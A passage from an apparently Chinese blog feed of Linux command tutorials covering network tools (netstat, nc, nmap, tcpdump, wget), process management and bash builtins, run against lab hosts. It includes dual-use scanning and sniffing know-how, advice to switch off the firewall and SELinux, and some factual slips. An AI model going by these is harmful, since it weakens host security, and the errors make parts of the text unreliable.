Address：远程主机地址和端口</p><p>第六列：State：socket的状态，通常仅仅TCP的状态，状态值可能有ESTABLISHED、SYN_SENT、SYN_RECV、FIN_WAIT1、FIN_WAIT2、TIME_WAIT、LISTEN等</p><p>状态解释：</p><p>ESTABLISHED：服务并发连接</p><p>SYN_SENT：尝试建立连接</p><p>SYN_RECV：已经从网络上收到一个连接请求</p><p>FIN_WAIT1：socket已关闭，连接正在或正要关闭</p><p>FIN_WAIT2：连接已关闭，冰球socket正在等待远端结束</p><p>TIME_WAIT：socket正在等待关闭处理仍在网络上的数据包，这个连接状态在生产场景中很重要，需要重点关注</p><p>CLOSED：socket不再被占用</p><p>CLOSED_WAIT：远端已经结束，等待socket关闭</p><p>LAST_ACK：远端已经结束，并且socket也已关闭，等待acknowlegement</p><p>LISTEN：socket正在监听连接请求</p><p>CLOSING：socket正在监听连接请求</p><p>UNKNOWN：socket状态未知</p><p>2、netstat -ntplu #显示所有TCP/UDP正在监听的连接信息</p><p><img src="640-1689662353943-126.png" alt="图片"></p><p> -p：进程号与进程名 -n：显示ip地址，不进行dns解析成主机名、域名  -t：显示所有tcp连接 -u：显示所有udp连接 -l：显示所有LISTEN状态的网络连接</p><p> 3、 netstat -rn #显示当前系统的路由表</p><p><img src="640-1689662355458-129.png" alt="图片"></p><p> 4、netstat -i #显示网络的接口状况</p><p><img src="640-1689662357496-132.png" alt="图片"></p><p> Iface：表示网络设备的接口名称</p><p>MTU：表示最大传输单元，单位为字节</p><p>RX-OK/TX-OK：表示已经准确无误地接受/发送了多少数据包</p><p>RX-ERR/TX-ERR：表示接受/发送数据包时产生了多少错误</p><p>RX-DRP/TX-DRP：表示接受/发送数据包时丢弃了多少数据包</p><p>RX-OVR/TX-OVR：表示由于误差而遗失了多少数据包</p><p>Flg：表示接口标记，其中各标记含义具体如下。</p><p>　　L：表示该接口是个回环设备。</p><p>　　B：表示设置了广播地址。</p><p>　　M：表示接受所有数据包。</p><p>　　R：表示接口正在运行。</p><p>　　U：表示接口处于活动状态。</p><p>　　O：表示在该接口上禁用arp。</p><p>　　P：表示一个点到点的连接。</p><p>正常情况下，RX-ERR/TX-ERR、RX-DRP/TX-DRP、RX-OVR/TX-OVR值应该为0，如果这几项值不为0，并且很大，那么网络质量肯定有问题，网络传输性能也一定会下降</p><p><strong>八、ss：查看网络状态</strong></p><p>1、ss -an #显示所有socket连接</p><p><img src="640-1689662359828-135.png" alt="图片"></p><p> ss -an | column -t #格式化展示</p><p><img src="640-1689662361927-138.png" alt="图片"></p><p> 2、ss -ntplu|column -t #显示所有正在监听的tcp和udp连接</p><p><img src="640-1689662363221-141.png" alt="图片"></p><p> 3、ss -s #统计当前established、closed、orphaned、waiting的所有tcp socket数量</p><p><img src="640-1689662364527-144.png" alt="图片"></p><p><strong>九、ping：测试主机之间的网络的连通性</strong></p><p>1、ping <a href="http://www.baidu.com/">www.baidu.com</a> #ping命令直接接域名或IP</p><p><img src="640-1689662365972-147.png" alt="图片"></p><p> 2、ping -c 3 -i 3 -s 1024 -t 255 <a href="http://www.baidu.com/">www.baidu.com</a> #-c 3:发送3次ICMP包，-i 3:每次发包时间间隔3s -s:1024 设置发送数据包大小1024字节 -t 255 设置发送数据库的ttl为255</p><p><img src="640-1689662368091-150.png" alt="图片"></p><p> <strong>十、traceroute：追踪数据传输路由状况</strong></p><p>1、traceroute <a href="http://www.baidu.com/">www.baidu.com</a> #查看主机的路由状况</p><p><img src="640-1689662369432-153.png" alt="图片"></p><p> 2、traceroute -I <a href="http://www.baidu.com/">www.baidu.com</a> #加快查询时间 ping查询</p><p><img src="640-1689662372067-156.png" alt="图片"></p><p> 3、traceroute -In <a href="http://www.baidu.com/">www.baidu.com</a> #不解析主机名</p><p><img src="640-1689662373418-159.png" alt="图片"></p><p><strong>十一、arping：发送arp请求</strong></p><p>1、arping -f 192.168.37.9 #使用-f 选项收到第一个响应时就退出，用于检测目的主机是否存活</p><p><img src="640-1689662375413-162.png" alt="图片"></p><p> 2、arping -f 10.0.0.3 #没有运行的主机不会响应，命令一直等待，值到ctrl+c终止</p><p><img src="640-1689662377759-165.png" alt="图片"></p><p> 3、arping -c 1 -I ens33 -s 10.0.0.5 10.0.0.2 #10.0.05-vip地址,10.0.0.2 上网网关。负载均衡器宕机时arp缓存导致故障时，让客户端缓存失效</p><p><strong>十二、telnet：远程登录主机</strong></p><p>telnet为明文，ssh为密文</p><p>telnet 192.168.37.9 22 #连接成功 ctrl+]进入</p><p><img src="640-1689662382171-168.png" alt="图片"></p><p> <strong>十三、nc：多功能网络工具</strong></p><p>测试nv命令时需要关闭防火墙和seliunx</p><p>systemctl stop firewalld.service #关闭防火墙</p><p>getenforce #关闭selinux</p><p>1、nc -l 12345 &gt; test01.nc #监听12345端口，将数据写入test01.nc</p><p><img src="640-1689662384527-171.png" alt="图片"></p><p> 2、nc 192.168.37.8 12345 &lt; test01.txt #使用nc命令向192.168.37.8端口传输 test01.txt文件</p><p><img src="640-1689662385986-174.png" alt="图片"></p><p> 3、 nc -l 80 &lt; testweb.txt #一直监听80端口，test.txt是发送给用户的内容</p><p><img src="640-1689662387712-177.png" alt="图片"></p><p> 4、nc cnblogs.com 80 #手动建立与HTTP服务器建立连接的例子</p><p><img src="640-1689662393549-180.png" alt="图片"></p><p> 5、nc -z -v 192.168.37.8 20-30 #扫描主机20-30端口</p><p><img src="640-1689662395484-183.png" alt="图片"></p><p>6、nc 127.0.0.1 12345 #模拟qq聊天工具，以下为窗口1，窗口2，窗口3</p><p><img src="640-1689662397113-186.png" alt="图片"></p><p> <img src="640-1689662398770-189.png" alt="图片"></p><p> <img src="640-1689662400574-192.png" alt="图片"></p><p><strong>十四、ssh：安全地远程登录主机</strong></p><p>1、ssh 192.168.37.9 #等同于ssh -p 22（默认22）</p><p><img src="640-1689662402369-195.png" alt="图片"></p><p> ctrl+d或logout退出</p><p><img src="640-1689662403974-198.png" alt="图片"></p><p> 2、ssh -p 22 <a href="mailto:&#108;&#x75;&#108;&#117;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x33;&#55;&#46;&#57;">&#108;&#x75;&#108;&#117;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x33;&#55;&#46;&#57;</a> #登录指定用户</p><p><img src="640-1689662409568-201.png" alt="图片"></p><p> 3、ssh -v <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x33;&#55;&#x2e;&#57;">&#x72;&#111;&#x6f;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x33;&#55;&#x2e;&#57;</a> #登录慢问题排查</p><p><img src="640-1689662411387-204.png" alt="图片"></p><p><strong>十五、wget：命令行下载工具</strong></p><p>1、特点：支持断点续传，支持FTP与HTTP，支持代理服务器，非常稳定</p><p>2、wget <a href="https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png">https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png</a> #wget接-下载地址</p><p><img src="640-1689662413680-207.png" alt="图片"></p><p> 3、wget -o ./testdir/123.png <a href="https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png">https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png</a> #-o 指定文件报错的地址与文件名</p><p><img src="640-1689662415476-210.png" alt="图片"></p><p> 4、wget –limit-rate=3k <a href="https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png">https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png</a> #限速下载3k/s</p><p><img src="640-1689662417349-213.png" alt="图片"></p><p> 5、wget -c <a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-2009.iso">http://mirrors.aliyun.com/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-2009.iso</a> #断点续传</p><p><img src="640-1689662419380-216.png" alt="图片"></p><p> 6、wget -c -b <a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-2009.iso">http://mirrors.aliyun.com/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-2009.iso</a> #-b 使用后台下载</p><p><img src="640-1689662420985-219.png" alt="图片"></p><p>7、wget –user-agent=”Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16” <a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-2009.iso">http://mirrors.aliyun.com/centos/7/isos/x86_64/CentOS-7-x86_64-DVD-2009.iso</a> #伪装代理名称下载，用于一些网站的限制</p><p><img src="640-1689662422912-222.png" alt="图片"></p><p> 8、wget -q -T 3 –tries=1 –spider <a href="http://www.baidu.com/">www.baidu.com</a> #采用静默访问方式，3秒超时，重试1此，模拟爬虫方式进行访问</p><p><img src="640-1689662424617-225.png" alt="图片"></p><p> <strong>十六、mailq：显示邮件传输队列</strong></p><p>1、mailq #查看邮件队列</p><p><img src="640-1689662426827-228.png" alt="图片"></p><p> 2、mailq -v #调式信息</p><p><img src="640-1689662428446-231.png" alt="图片"></p><p> <strong>十七、mail：发送和接受邮件</strong></p><p>1、mail是个软链接，真实的程序是mailx</p><p><img src="640-1689662430607-234.png" alt="图片"></p><p> 2、mail -s “hello world from bk” <a href="mailto:&#x31;&#x31;&#52;&#53;&#x35;&#x38;&#48;&#50;&#x30;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x31;&#x31;&#52;&#53;&#x35;&#x38;&#48;&#50;&#x30;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a> #发送邮件，以下手动输入，ctrl+d结束，邮件发出</p><p><img src="640-1689662432227-237.png" alt="图片"></p><p> 3、echo -e “hello,this is a mail\nwelcom to <a href="http://www.baidu.com&quot;|mail">www.baidu.com&quot;|mail</a> -s “hello from bk” <a href="mailto:&#x31;&#x31;&#52;&#53;&#53;&#x38;&#48;&#x32;&#48;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#109;">&#x31;&#x31;&#52;&#53;&#53;&#x38;&#48;&#x32;&#48;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#109;</a> #使用管道发送邮件，echo后面是正文</p><p><img src="640-1689662434236-240.png" alt="图片"></p><p> 4、#使用输入重定向将文件内容发送mail</p><p><img src="640-1689662436174-243.png" alt="图片"></p><p> 5、echo “test”|mail -s “test” -a abc.jpg <a href="mailto:&#x31;&#49;&#x34;&#53;&#53;&#x38;&#x30;&#50;&#x30;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#109;">&#x31;&#49;&#x34;&#53;&#53;&#x38;&#x30;&#50;&#x30;&#64;&#113;&#x71;&#46;&#99;&#x6f;&#109;</a> #发送邮件附件</p><p><img src="640-1689662437927-246.png" alt="图片"></p><p> <strong>十八、nslookup：域名查询工具</strong></p><p>1、 nslookup #进入交互模式</p><p><img src="640-1689662440004-249.png" alt="图片"></p><p> 2、nslookup - 223.5.5.5 #命令行指定解析域名服务器</p><p><img src="640-1689662441596-252.png" alt="图片"></p><p> 3、nslookup <a href="http://www.baidu.com/">www.baidu.com</a> 223.5.5.5 #非交互模式-使用域名解析服务器地址 查询域名</p><p><img src="640-1689662443395-255.png" alt="图片"></p><p><strong>十九、dig：域名查询工具</strong></p><p>1、dig <a href="http://www.baidu.com/">www.baidu.com</a> #查询指定域名的ip</p><p><img src="640-1689662444983-258.png" alt="图片"></p><p> 2、dig -x 223.5.5.5  #反向域名解析</p><p><img src="640-1689662446693-261.png" alt="图片"></p><p> 3、dig -t MX <a href="http://www.baidu.com/">www.baidu.com</a> #查询MX类型的域名</p><p><img src="640-1689662448808-264.png" alt="图片"></p><p> 4、dig @223.5.5.5 <a href="http://www.baidu.com/">www.baidu.com</a> +trace #显示域名解析成IP的完整过程</p><p><img src="640-1689662450435-267.png" alt="图片"></p><p> <img src="640-1689662456000-270.png" alt="图片"></p><p> 5、dig +nocmd +nocomment +nostat <a href="http://www.baidu.com/">www.baidu.com</a> #精简一些说明信息</p><p><img src="640-1689662461388-273.png" alt="图片"></p><p> <strong>二十、host：域名查询工具</strong></p><p>1、host <a href="http://www.baidu.com/">www.baidu.com</a> #域名查找</p><p><img src="640-1689662463536-276.png" alt="图片"></p><p> 2、host -a <a href="http://www.baidu.com/">www.baidu.com</a> #查询详细信息</p><p><img src="640-1689662464794-279.png" alt="图片"></p><p> 3、host -a <a href="http://www.baidu.com/">www.baidu.com</a> 223.5.5.5 #直接接指定的dns服务器IP</p><p><img src="640-1689662466539-282.png" alt="图片"></p><p> 4、host -t MX <a href="http://www.baidu.com/">www.baidu.com</a> #指定查询类型</p><p><img src="640-1689662468197-285.png" alt="图片"></p><p> <strong>二十一、nmap：网络探测工具和安全/端口扫描器</strong></p><p>1、nmap 192.168.37.9 #查看主机当前开放的端口</p><p><img src="640-1689662469746-288.png" alt="图片"></p><p> 2、nmap -p 1024-65535 192.168.37.9 #扫描指定的端口</p><p><img src="640-1689662471421-291.png" alt="图片"></p><p> 3、nmap 192.168.37.0/24 #扫描局域网网段</p><p><img src="640-1689662472843-294.png" alt="图片"></p><p> 4、nmap 192.168.37.7-9 #范围扫描</p><p><img src="640-1689662474926-297.png" alt="图片"></p><p> 5、nmap -O -sV 192.168.37.8 #探测目标主机服务和操作系统</p><p><img src="640-1689662477367-300.png" alt="图片"></p><p> <strong>二十二、tcpdump：监听网络流量</strong></p><p>1、tcpdump #监视第一个网络接口下所有的数据包</p><p><img src="640-1689662479814-303.png" alt="图片"></p><p> 2、tcpdump -i ens33 -q #-i指定端口 -q精简信息输出</p><p><img src="640-1689662481291-306.png" alt="图片"></p><p> 3、tcpdump -n host 192.168.37.8 -i ens33 #监听指定主机 -n不进行域名解析，加快显示</p><p><img src="640-1689662482920-309.png" alt="图片"></p><p> 4、tcpdump -n src host 192.168.37.8 -i ens33 #只监听从192.168.37.8发出的数据包</p><p><img src="640-1689662484742-312.png" alt="图片"></p><p> 5、tcpdump -n dst host 192.168.37.8 -i ens33 #只监听192.168.37.9收到数据包</p><p><img src="640-1689662486743-315.png" alt="图片"></p><p> 6、tcpdump -nn port 22 -i ens33 #-n不进行DNS解析，但是22会换ssh，-nn彻底</p><p><img src="640-1689662488723-318.png" alt="图片"></p><p> 7、tcpdump -n arp -i ens33 #监听指定协议数据包</p><p><img src="640-1689662490316-321.png" alt="图片"></p><p> <img src="640-1689662491830-324.png" alt="图片"></p><p> 8、tcpdump ip host 192.168.37.8 -i ens33 and ! 168.168.37.9 -i ens33 #获取主机1与除主机2外通信的所有数据包</p><p><img src="640-1689662493420-327.png" alt="图片"></p><p> 9、tcpdump tcp dst port 80 or scr 192.168.37.8 -i ens33 -n #抓取tcp包</p><p><img src="640-1689662495062-330.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux进程管理命令</title>
    <link href="/2023/07/18/Linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/07/18/Linux%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>文档目录：</p><p>一、ps：查看进程</p><p>二、pstree：查看进程状态树</p><p>三、pgrep：查找匹配条件的进程</p><p>四、kill：终止进程</p><p>五、killall：通过进程名终止进程</p><p>六、pkill：通过进程名种植进程</p><p>七、top：实时显示系统中各个进程的资源占用状况</p><p>八、nice：调整程序运行时的优先级</p><p>九、renice：调整运行中的进程的优先级</p><p>十、nohup：用户退出系统进程继续工作</p><p>十一、strace：跟踪进程的系统调用</p><p>十二、ltrace：跟踪进程调用库函数</p><p>十三、runlevel：输出当前运行级别</p><p>十四、init：初始化Liunx进程</p><p>十五、service：管理系统服务</p><p><strong>一、ps：查看进程</strong></p><p>1、ps #当前终端窗口的进程 PID进程标识符 TTY进程所属的终端控制台 TIME进程所使用的总的CPU时间 CMD正在执行的命令行</p><p><img src="640.png" alt="图片"></p><p> 2、ps -ef #使用UNIX格式输出每个进程信息 UID进程所属UID，PPID父进程 C为cpu占比 STIME进程开始时间 tty无法终端？本地tty1-6，网络pts/0</p><p><img src="640-1689662022863-3.png" alt="图片"></p><p> 3、ps -ef | grep ssh #过滤进程</p><p><img src="640-1689662024615-6.png" alt="图片"></p><p> 4、 ps aux #使用BSD格式显示进程信息 vsz虚拟内存量 stat该进程的状态：r运行S中断睡眠d不可中断睡眠t侦测/停止z终止+前台l多线程N低优先级&lt;高优先级s进程领导者L页面锁定到内存</p><p><img src="640-1689662026458-9.png" alt="图片"></p><p> 5、ps -u root # UNIX格式参数，使用用户的相关进程</p><p><img src="640-1689662028512-12.png" alt="图片"></p><p> 6、 ps -l #以详细的格式显示进程状态 PRI：优先执行顺序 NI-nice值 ADDR-进程在内存哪个部分，running一般是- SZ使用掉内存大小 WCHAN-目前进程是否运行中-正在运</p><p><img src="640-1689662030125-15.png" alt="图片"></p><p> 7、ps -eH #-e显示所有进程，-H参数显示进程数,UNIX格式</p><p><img src="640-1689662031949-18.png" alt="图片"></p><p>8、ps axf|grep ssh #ax显示所有进程，f显示进程数，BSD格式</p><p><img src="640-1689662033915-21.png" alt="图片"></p><p> 9、ps -eo ‘%P%y%x%c’|grep ssh #输出指定字段 通过man ps查询字段 p-ppid y-tty x-time c-command</p><p><img src="640-1689662035963-24.png" alt="图片"></p><p> 10、ps -eo pid,user,args –sort pid | grep ssh #标准格式输出指定字段 ，并且根据某个字段排序</p><p><img src="640-1689662040724-27.png" alt="图片"></p><p><strong>二、pstree：查看进程状态树</strong></p><p>1、pstree #不指定进程pid号，或者不指定用户名，即以init进程为根进程，显示系统所有进程信息</p><p><img src="640-1689662050136-30.png" alt="图片"></p><p> 2、pstree root #显示指定用户的进程</p><p><img src="640-1689662053460-33.png" alt="图片"></p><p> 3、pstree -u #显示进程所属的用户组</p><p><img src="640-1689662059280-36.png" alt="图片"></p><p> <strong>三、pgrep：查找匹配条件的进程</strong></p><p>1、pgrep crond #显示指定进程的pid，结合ps与grep功能</p><p><img src="640-1689662061932-39.png" alt="图片"></p><p> 2、pgrep -u root #-u显示指定root用户的所有进程号</p><p><img src="640-1689662063481-42.png" alt="图片"></p><p> <strong>四、kill：终止进程</strong></p><p>1、kill -l #显示系统的所有信号</p><p><img src="640-1689662070185-45.png" alt="图片"></p><p> 2、kill -l SIGKILL #对信号名与数字进行互换</p><p><img src="640-1689662072465-48.png" alt="图片"></p><p>3、常用信号说明：</p><p>HUP(1)：挂起-通常因终端掉线或用户退出而引发</p><p>INT(2)：中断-通常是按下ctrl+c组合键来触发</p><p>QUIT(3)：退出-通常是按下ctrl+\组合键来触发</p><p>KILL(9)：立即结束进程的运行</p><p>TERM(15)：终止-通常在系统关机时发送</p><p>TSTP(20)：暂停进程的运行-通常是按下ctrl+z组合键来触发</p><p>4、kill 1474 #默认使用信号15终止进程，常用</p><p><img src="640-1689662073975-51.png" alt="图片"></p><p> 5、kill -9 1474 #强制关闭进程</p><p><img src="640-1689662076267-54.png" alt="图片"></p><p> 6、kill -0 1474 #特殊信号，用于进程检查</p><p><img src="640-1689662078191-57.png" alt="图片"></p><p> <strong>五、killall：通过进程名终止进程</strong></p><p>1、killall crond #终止定时服务进程</p><p><img src="640-1689662080864-60.png" alt="图片"></p><p> 2、killall -w crond #-w会看到等待几秒后结束命令操作</p><p><img src="640-1689662096643-63.png" alt="图片"></p><p>3、killall -u lulu nginx #终止lulu用户的所有nginx进程</p><p><img src="640-1689662099328-66.png" alt="图片"></p><p> <strong>六、pkill：通过进程名种植进程</strong></p><p>1、pkill crond #终止定时任务进程</p><p><img src="640-1689662101555-69.png" alt="图片"></p><p> 2、pkill -t tty1 #-t杀死指定终端的进程（正在编辑/etc/rc.local）</p><p><img src="640-1689662105770-72.png" alt="图片"></p><p> 3、pkill -u root #杀死指定用户的所有进程</p><p><img src="640-1689662108749-75.png" alt="图片"></p><p><strong>七、top：实时显示系统中各个进程的资源占用状况</strong></p><p>1、top #交互式命令</p><p><img src="640-1689662115813-78.png" alt="图片"></p><p>说明：</p><p>第一行：任务列队信息，同uptime命令的执行结果，包含：当前系统时间，系统运行时间，当前登录的用户，1m/5m/15m的平均负载情况</p><p>第二行：tasks为任务(进程)，系统共104个进程，其中运行中1个，103个休眠，0个stoped，0个僵死</p><p>第三行：cpu状态：us-用户空间占比，sy-内核空间占比，ni-改变过优先级的进程占比，id-空闲cpu占比，wa-i/o等待占比，hi-硬中断占比，si-软中断占比，st-虚拟机占比</p><p>第四行：内存状态：total-物理内存总量，used-使用中内存总量，free-空闲内存总量，buffers-缓冲的内存量</p><p>第五行：swap交换分区信息：total-交换区总量，used-使用的交换区总量，free-空闲交换区总量，cached-缓存的内存量</p><p>第六行：空行</p><p>第七行：各进程的状态监控：PID-进程id，USER-进程所有者，</p><p> 2、top再按照1：显示多核不同cpu的信息</p><p><img src="640-1689662121577-81.png" alt="图片"></p><p> 3、top -b #以批处理模式显示进程信息，不停向下刷新</p><p>4、top -c #使用参数-c显示进程的完整路径</p><p><img src="640-1689662123441-84.png" alt="图片"></p><p> 5、top -d 3 #指定更新周期为3秒</p><p>6、top -n 2 #指定更新次数为2次后退出</p><p>7、top -p 1403 #-p指定进程号监控</p><p><img src="640-1689662124983-87.png" alt="图片"></p><p> 8、top中b、z、x为高亮显示，&gt; 与 &lt; 可以向右或向左改变排序列</p><p><strong>八、nice：调整程序运行时的优先级</strong></p><p>1、nice #显示当前系统默认的程序运行优先级为0</p><p><img src="640-1689662127313-90.png" alt="图片"></p><p> 2、nice nice #以默认值10来调整第二个nice命令运行的优先级</p><p><img src="640-1689662130683-93.png" alt="图片"></p><p> 3、nice nice nice #第二个nice命令运行优先级的基础上再加10，为20，但是最小程序运行优先级为19</p><p><img src="640-1689662132586-96.png" alt="图片"></p><p> 4、ps -l #查看进程的优先级（PRT越小优先级越高，NI-优先值）</p><p><img src="640-1689662134592-99.png" alt="图片"></p><p> 5、nice -n -10 vim test2 &amp; 使用nice调整为-10</p><p><img src="640-1689662136644-102.png" alt="图片"></p><p><strong>九、renice：调整运行中的进程的优先级</strong></p><p>renice -n -5 -p 1471 #-p指定值为2711的进程，调整NI值为5</p><p><img src="640-1689662138951-105.png" alt="图片"></p><p><strong>十、nohup：用户退出系统进程继续工作</strong></p><p>nohup命令将输出重定向到终端，默认当前目录的nohup.out文件中，如果当前目录文件不可写，则输出重定向到$HOME/nohup.out文件中</p><p>1、nohup ping <a href="http://www.baidu.com/">www.baidu.com</a> #当前终端已hang住，此时强制关闭当前终端，ping命令依然会在后台运行</p><p><img src="640-1689662141715-108.png" alt="图片"></p><p> 另一个ssh终端打开</p><p><img src="640-1689662142987-111.png" alt="图片"></p><p> 2、nohup ping <a href="http://www.baidu.com/">www.baidu.com</a> &amp; #一般nohup配合&amp;运行，让程序直接后台运行</p><p><img src="640-1689662144747-114.png" alt="图片"></p><p><strong>十一、strace：跟踪进程的系统调用</strong></p><p>用于检查一个应用程序所使用的系统调用以及它接收的系统信息。strace会追踪程序运行时整个生命周期，输出每一个系统调用的名字、参数、返回值、消耗时间等，是高级运维和开发人员排查问题的杀手锏</p><p>1、strace -tt -f /usr/bin/ping #-f跟踪目标进程，以及子进程，-tt每一行前加上时间信息</p><p><img src="640-1689662146773-117.png" alt="图片"></p><p> 2、strace -tt -f -e trace=file /usr/bin/ping #trace=file只跟踪与文件操作有关的系统调用</p><p><img src="640-1689662149204-120.png" alt="图片"></p><p> 3、strace -tt -f -e trace=file -p 1597 #-p跟踪指定的进程</p><p><img src="640-1689662151466-123.png" alt="图片"></p><p> 4、strace -c /usr/bin/ping #-c为进程所有系统调用做一个统计分析</p><p><img src="640-1689662152752-126.png" alt="图片"></p><p> 5、strace -c -o tongji.log /usr/bin/ping #-o将strace结果输出到文件</p><p><img src="640-1689662154748-129.png" alt="图片"></p><p> 6、strace -T /usr/bin/ping #-T将每个系统调用花费的时间打印出来，花销在调用行最右边的尖括号内</p><p><img src="640-1689662157356-132.png" alt="图片"></p><p><strong>十二、ltrace：跟踪进程调用库函数</strong></p><p>ltrace能跟踪显示调用了哪个库函数，用法与strace非常相似</p><p>1、ltrace /usr/bin/ping #ltrace接需要检测的命令语句</p><p><img src="640-1689662158992-135.png" alt="图片"></p><p> 2、ltrace -p 1665 #-p跟踪指定进程号</p><p><img src="640-1689662160953-138.png" alt="图片"></p><p><strong>十三、runlevel：输出当前运行级别</strong></p><p>1、runlevel #查看当前系统的运行级别</p><p><img src="640-1689662162395-141.png" alt="图片"></p><p> 2、系统级别说明</p><p>0：停机</p><p>1：单用户模式</p><p>2：无网络的多用户模式</p><p>3：多用户模式</p><p>4：未使用</p><p>5：图形界面多用户模式</p><p>6：重启</p><p><strong>十四、init：初始化Liunx进程</strong></p><p>init为liunx下进程初始化工具，是所有Liunx进程的父进程，根据/etc/inittab创建Liunx进程</p><p>1、init 0 #关机</p><p><img src="640-1689662164483-144.png" alt="图片"></p><p> 2、init 6 #重启</p><p><img src="640-1689662166333-147.png" alt="图片"></p><p><strong>十五、service：管理系统服务</strong></p><p>service用于对系统服务进行管理：比如start、stop、restart、reload、status等，CentOs7里被systemctl取代</p><p>1、service –status-all #显示所有服务状态</p><p><img src="640-1689662168377-150.png" alt="图片"></p><p> 2、service crond stop #停止服务</p><p><img src="640-1689662169985-153.png" alt="图片"></p><p> 3、service crond start #启动服务</p><p><img src="640-1689662171565-156.png" alt="图片"></p><p> 4、 service crond restart #重启服务</p><p><img src="640-1689662173494-159.png" alt="图片"></p><p> 5、service crond status #查看服务状态</p><p><img src="640-1689662175080-162.png" alt="图片"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux系统常用内置命令</title>
    <link href="/2023/07/18/Linux%E7%B3%BB%E7%BB%9F%E5%B8%B8%E7%94%A8%E5%86%85%E7%BD%AE%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/07/18/Linux%E7%B3%BB%E7%BB%9F%E5%B8%B8%E7%94%A8%E5%86%85%E7%BD%AE%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>文档目录：</p><p>一、Liunx内置命令概述</p><p>二、LIunx常用内置命令实例</p><p>1、help查看内置命令帮助<br>2、查看内置命令使用方法<br>3、”:” 占位符<br>4、 “.” 与source<br>5、条件测试”[“和test<br>6、命令别名alias和unalias<br>7、后台任务相关bg/fg/jobs<br>8、break跳出循环<br>9、continue进入下一次循环<br>10、eval将参数当作命令执行<br>11、exit退出<br>12、export查看或设置全局变量<br>13、history查看命令历史记录<br>14、read交互式赋值变量<br>15、type判断命令类型<br>16、umlit修改系统资源使用限制<br>17、unset清空变量</p><p><strong>一、Liunx内置命令概述</strong></p><p>内置命令在BASH解释器中，天生与其他普通的命令不同，系统启动成功时就在内存中。</p><p>执行效率远远高于普通命令。</p><p>而特殊的命令如：echo、pwd、kill等，既有内置命令版本，也有普通命令版本，用法一样，我们能在磁盘上找到他们的程序文件/bin/echo、/bin/pwd、/bin/kill，一般情况下，优先使用内置命令，除非显示的执行/bin/echo这种全路径命令</p><p><strong>二、LIunx常用内置命令实例</strong></p><p><strong>1、help查看内置命令帮助</strong></p><p><img src="640.png" alt="图片"></p><p> <strong>2、查看内置命令使用方法</strong></p><p>help help</p><p><img src="640-1689661822942-3.png" alt="图片"></p><p> help cd</p><p><img src="640-1689661824933-6.png" alt="图片"></p><p> <strong>3、”:” 占位符</strong></p><p>shell脚本中使用：作为占位符，防止报错</p><p><strong>4、 “.” 与source</strong></p><p> “.” 与source常用于加载或执行shell脚本</p><p>第一种执行方式：bash scrpt-name 或 sh scrpt-name执行方式：当没有可执行权限时经常使用的方法,此外，脚本没有解释器时也需要用到。</p><p>第二种执行方式：source scrpt-name 或 . scrpt-name执行方式：读入或加载指定的shell脚本，然后，依次执行指定的shell脚本中的所有脚本，可传递值到父脚本shell</p><p><strong>5、条件测试”[“和test</strong></p><p>[]与test条件控制使用</p><p>test -f file &amp;&amp; echo true || echo false #如果file文件存在并且是普通文件就是真，不存在输出false</p><p>[ -f file ] &amp;&amp; echo 1 || echo 0 #文件存在，返回1</p><p><img src="640-1689661827624-9.png" alt="图片"></p><p> <strong>6、命令别名alias和unalias</strong></p><p>alias #显示系统别名</p><p><img src="640-1689661829301-12.png" alt="图片"></p><p> alias ens33=’cat /etc/sysconfig/network-scripts/ifcfg-ens33’ #设置ens33别名</p><p><img src="640-1689661830900-15.png" alt="图片"></p><p> unalias ens33 #删除别名</p><p><img src="640-1689661833260-18.png" alt="图片"></p><p> <strong>7、后台任务相关bg/fg/jobs</strong></p><p>bg：将前台执行任务转入后台，或者将后台暂停的任务运行起来；fg命令和bg命令相反，它是将后台任务调到前台来执行；jobs命令可以用于查看后台任务列表</p><p>jobs #查看任务列表</p><p>bg # bg 1将第一个任务启动</p><p>fg #将后台任务调入前台</p><p><img src="640-1689661835275-21.png" alt="图片"></p><p>nc -l 12345 &amp; #直接使用&amp;将任务放入后台，并且任务状态是运行的</p><p>kill %1 #快速杀除后台任务</p><p><img src="640-1689661837304-24.png" alt="图片"></p><p> <strong>8、break跳出循环</strong></p><p><img src="640-1689661838923-27.png" alt="图片"></p><p> <strong>9、continue进入下一次循环</strong></p><p><img src="640-1689661840816-30.png" alt="图片"></p><p> <strong>10、eval将参数当作命令执行</strong></p><p>eval echo ‘<code>hostname -I</code>‘ 